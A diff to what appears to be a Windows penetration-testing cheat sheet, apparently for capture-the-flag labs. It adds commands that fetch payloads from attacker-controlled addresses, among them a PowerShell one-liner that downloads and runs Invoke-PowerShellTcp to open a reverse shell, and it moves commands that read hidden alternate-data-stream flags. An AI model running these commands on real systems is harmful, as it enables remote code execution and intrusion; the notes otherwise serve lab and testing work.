@@ -6,15 +6,19 @@ curl -o example.txt http://example.com/file.txt
 
 certutil.exe -urlcache -split -f http://<ip>/file file_save
 
+copy \\10.10.14.2\SHARE\6shell.exe
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.21.174.231:8000/shell.exe','shell.exe')"
+
+```
+
+Sync time with DCs
+```
 timedatectl set-ntp 0
 
 ntpdate $IP
-
-dir /R
-
-# Alternate Data Streams are commonly used for storing hidden data or metadata
-Get-Content "C:\Users\Administrator\Desktop\hm.txt:root.txt"
-more < hm.txt:root.txt:$DATA
 ```
 
 Get Processes
@@ -161,6 +165,12 @@ dir /s Unattend.xml
 
 ### Look Around
 ```powershell
+dir /R
+
+# Alternate Data Streams are commonly used for storing hidden data or metadata
+Get-Content "C:\Users\Administrator\Desktop\hm.txt:root.txt"
+more < hm.txt:root.txt:$DATA
+
 #Starting, Restarting and Stopping services in Powershell
 Start-Service <service>
 Stop-Service <service>
